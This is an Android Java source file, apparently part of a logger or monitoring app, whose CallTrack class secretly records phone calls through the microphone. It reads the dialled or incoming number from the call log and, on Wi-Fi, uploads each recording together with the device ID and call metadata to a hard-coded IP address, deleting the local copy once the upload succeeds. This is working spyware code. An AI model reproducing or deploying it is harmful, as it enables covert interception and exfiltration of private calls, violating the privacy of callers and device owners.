package com.os.logger.track;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.SystemClock;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.os.logger.FileHelper;
import com.os.logger.LogUtil;
import com.os.logger.PreferenceUtil;
import com.os.logger.TelephonyHelper;
import com.os.logger.UploadHelper;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * Created by Alan on 16/5/16.
 */
public class CallTrack extends BaseTrack {

    private static String sUrl = "http://139.196.39.184/send_call";

    private MediaRecorder recorder;
    private MyPhoneStateListener listener;
    private long mRecordStartTime;
    private String mFileName;


    public CallTrack(Context context) {
        super(context);
    }

    @Override
    public void sync() {
        uploadReport();
    }

    private void releaseRecorder() {
        LogUtil.e("releaseRecorder");
        if (recorder == null) {
            return;
        }
        try {
            recorder.stop();
            recorder.reset();
            recorder.release();
        } catch (IllegalStateException e) {
            e.printStackTrace();
        }
        recorder = null;
        long duration = (SystemClock.uptimeMillis() - mRecordStartTime) / 1000;
        addDurationInfo(duration);
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (TextUtils.isEmpty(PhoneNumber.getNumber())) {
                    String number = readPhoneNumber();
                    LogUtil.addLocalLog("calllog number:" + number);
                    if (!TextUtils.isEmpty(number)) {
                        File dir = getDirPath();
                        if (!dir.exists() || !dir.isDirectory()) {
                            return;
                        }

                        File[] files = dir.listFiles();
                        for (File file : files) {
                            if (modifyNumber(file, number)) {
                                return;
                            }
                        }
                    }
                }
                uploadReport();
            }
        }, 1000);
    }

    private boolean modifyNumber(File file, String number) {
        String name = file.getName();
        if (!TextUtils.equals(name,mFileName)){
            return false;
        }
        String[] sources = name.split("_");
        if (sources.length == 5 && TextUtils.equals(sources[1], "null")) {
            String newName = sources[0] + "_" + number + "_" + sources[2] + "_" + sources[3] + "_"
                    + sources[4];
            mFileName = newName;
            LogUtil.e(mFileName);
            file.renameTo(new File(file.getParentFile(), newName));
            return true;
        }
        return false;
    }


    private String readPhoneNumber() {
        try {
            ContentResolver contentResolver = getContext().getContentResolver();
            Cursor cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE}, null, null,
                    CallLog.Calls.DEFAULT_SORT_ORDER);
            if (cursor != null && cursor.moveToFirst()) {
                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                String number = cursor.getString(numberIndex);
//            int type = cursor.getInt(typeIndex);
                return number;
            }
        } catch (Exception e) {
            LogUtil.addLocalLog("exception in readPhoneNumber:" + e.getMessage());
            e.printStackTrace();
        }
        return null;
    }

    private void addDurationInfo(long duration) {
        File dir = getDirPath();
        if (!dir.exists() || !dir.isDirectory()) {
            return;
        }

        File[] files = dir.listFiles();
        for (File file : files) {
            if (addDurationInfo2File(file, duration)) {
                return;
            }
        }
    }

    private boolean addDurationInfo2File(File file, long duration) {
        String name = file.getName();
        if (!TextUtils.equals(name,mFileName)){
            return false;
        }
        String[] sources = name.split("_");
        if (sources.length == 4) {
            //无duration信息
            String newName = sources[0] + "_" + sources[1] + "_" + sources[2] + "_" + duration + "_"
                    + sources[3];
            mFileName = newName;
            LogUtil.e(mFileName);
            file.renameTo(new File(file.getParentFile(), newName));
            return true;
        }
        return false;
    }

    private void startRecording() {
        LogUtil.e("startRecording");
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        Date date = new Date();
        SimpleDateFormat format = new SimpleDateFormat("yyMMddHHmmss", Locale.US);
        String name = format.format(date);
        String username = PreferenceUtil.getString(getContext(), PreferenceUtil.KEY_USER_NAME);
        String number = PhoneNumber.getNumber();
        int type = PhoneNumber.getType();
        mFileName = username + "_" + number + "_" + type + "_" + name + ".m4a";
        LogUtil.e(mFileName);
        File file = new File(getDirPath(), mFileName);
        recorder.setOutputFile(file.getAbsolutePath());
        try {
            recorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
            recorder = null;
            return;
        }
        recorder.start();
        mRecordStartTime = SystemClock.uptimeMillis();
    }

    private File getDirPath() {
        File parent = FileHelper.getDir(getContext());
        File path = new File(parent.getAbsolutePath(), "log");
        if (!path.exists()) {
            path.mkdir();
        }
        return path;
    }

    private void uploadReport() {
        if (!inWifi()) {
            return;
        }

        File dir = getDirPath();
        if (!dir.exists() || !dir.isDirectory()) {
            return;
        }

        File[] files = dir.listFiles();
        for (File file : files) {
            report(file);
        }

    }

    private void report(final File file) {
        LogUtil.e("report call:" + file.getName() + ":" + file.length());
        HashMap<String, String> args = new HashMap<>();
        String username = PreferenceUtil.getString(getContext(), PreferenceUtil.KEY_USER_NAME);
        if (!TextUtils.isEmpty(username)) {
            args.put("username", username);
        }
        args.put("deviceid", TelephonyHelper.getDeviceId(getContext()));
        args.put("to", findNumber(file));
        args.put("type", findType(file));
        args.put("time", String.valueOf(file.lastModified()));
        args.put("duration", findDuration(file));
        UploadHelper.getInstance().uploadForm(sUrl, file, args, new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                UploadHelper.getInstance().removeFormCall(call);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (isSuccessFul(response)) {
                    file.delete();
                }
                UploadHelper.getInstance().removeFormCall(call);
            }
        });
    }

    private String findNumber(File file) {
        String name = file.getName();
        String[] sources = name.split("_");
        return sources[1];
    }

    private String findType(File file) {
        String name = file.getName();
        String[] sources = name.split("_");
        return sources[2];
    }

    private String findDuration(File file) {
        String name = file.getName();
        String[] sources = name.split("_");
        if (sources.length < 5) {
            return "0";
        }
        return sources[3];
    }

    private boolean isSuccessFul(Response response) {
        if (!response.isSuccessful()) {
            response.body().close();
            return false;
        }
        String body = null;
        try {
            body = response.body().string();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return body != null && !body.contains("errorno");
    }

    @Override
    public void destroy() {
        if (listener != null) {
            TelephonyManager manager = (TelephonyManager) getContext().getSystemService(
                    Context.TELEPHONY_SERVICE);
            manager.listen(listener, PhoneStateListener.LISTEN_NONE);
        }
    }

    @Override
    public void ready() {
        listener = new MyPhoneStateListener();
        TelephonyManager manager = (TelephonyManager) getContext().getSystemService(
                Context.TELEPHONY_SERVICE);
        manager.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
    }

    private class MyPhoneStateListener extends PhoneStateListener {
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE:
                    releaseRecorder();
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    try {
                        startRecording();
                    } catch (Exception e) {
                        //permission denied
                    }
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    PhoneNumber.setIncomingNumber(incomingNumber);
                    LogUtil.e("number:" + incomingNumber);
                    LogUtil.addLocalLog("number in PhoneStateListener:" + incomingNumber);
                    break;
            }
            super.onCallStateChanged(state, incomingNumber);
        }
    }
}
